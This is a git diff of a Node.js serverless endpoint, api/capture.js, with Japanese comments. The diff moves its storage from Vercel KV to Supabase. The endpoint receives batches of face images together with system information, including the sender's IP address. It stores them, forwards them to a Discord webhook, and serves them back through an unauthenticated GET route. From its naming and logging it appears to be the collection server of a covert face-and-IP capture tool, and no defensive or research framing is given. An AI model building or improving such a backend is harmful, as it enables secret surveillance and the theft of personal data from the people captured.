@@ -1,5 +1,5 @@
 // api/capture.js
-import { kv } from '@vercel/kv';
+import { supabase } from '../../lib/supabaseClient'; // Supabaseクライアントをインポート
 
 export default async function handler(req, res) { // async functionに変更
     console.log('Capture API called:', req.method, req.url);
@@ -18,22 +18,25 @@ export default async function handler(req, res) { // async functionに変更
         try {
             const { images, system_info, timestamp } = req.body;
             
-            // 新しいキャプチャデータを準備
             const captureData = {
-                id: Date.now(),
-                timestamp: timestamp || new Date().toISOString(),
+                // idはSupabaseが自動生成するので不要
+                created_at: timestamp || new Date().toISOString(),
                 images: images || [],
                 system_info: system_info || {},
                 capture_count: images ? images.length : 0
             };
+
+            // Supabaseの 'captures' テーブルにデータを挿入
+            const { data, error } = await supabase
+                .from('captures')
+                .insert([captureData])
+                .select();
+
+            if (error) {
+                throw error;
+            }
             
-            // Vercel KVにデータを保存 (リストの先頭に追加)
-            await kv.lpush('captured_faces', JSON.stringify(captureData));
-            
-            // リストが50件を超えたら、古いものから削除して50件に保つ
-            await kv.ltrim('captured_faces', 0, 49);
-            
-            console.log(`新しい顔画像を受信: ${captureData.capture_count}枚, IP: ${system_info?.ip_address || 'Unknown'}`);
+            console.log(`新しい顔画像をSupabaseに保存しました: ${captureData.capture_count}枚, IP: ${system_info?.ip_address || 'Unknown'}`);
             
             // Discord Webhookにも送信（非同期）
             (async () => {
@@ -74,12 +77,11 @@ export default async function handler(req, res) { // async functionに変更
             
             res.status(200).json({
                 success: true,
-                message: '画像を正常に受信しました',
-                id: captureData.id
+                message: '画像を正常に受信し、Supabaseに保存しました',
+                id: data ? data[0].id : null
             });
         } catch (error) {
-            console.error('画像受信エラー:', error);
-            console.error('Request body:', req.body);
+            console.error('画像保存エラー:', error);
             res.status(500).json({
                 success: false,
                 error: '画像の保存に失敗しました',
@@ -87,9 +89,17 @@ export default async function handler(req, res) { // async functionに変更
             });
         }
     } else if (req.method === 'GET') {
-        // Vercel KVからデータを取得
-        const data = await kv.lrange('captured_faces', 0, -1);
-        res.status(200).json(data.map(item => JSON.parse(item)));
+        // Supabaseからデータを取得
+        const { data, error } = await supabase
+            .from('captures')
+            .select('*')
+            .order('created_at', { ascending: false })
+            .limit(50);
+
+        if (error) {
+            return res.status(500).json({ error: error.message });
+        }
+        res.status(200).json(data);
     } else {
         res.status(405).json({ error: 'Method not allowed' });
     }
